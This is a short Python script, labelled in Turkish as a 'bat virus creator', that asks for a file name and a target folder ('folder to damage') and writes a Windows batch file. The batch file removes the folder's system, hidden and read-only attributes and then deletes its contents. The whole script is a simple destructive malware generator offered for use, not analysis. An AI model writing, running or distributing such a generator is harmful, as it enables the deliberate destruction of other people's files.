import os
os.system("title bat virüs oluşturucu")
fn = input("dosya ismi:")
zr = input("zarar verilecek klasör:")
file = open(fn+".bat","w")
file.writelines(["@echo off\n","attrib -s -h -r -a "+zr+"\n","del "+zr])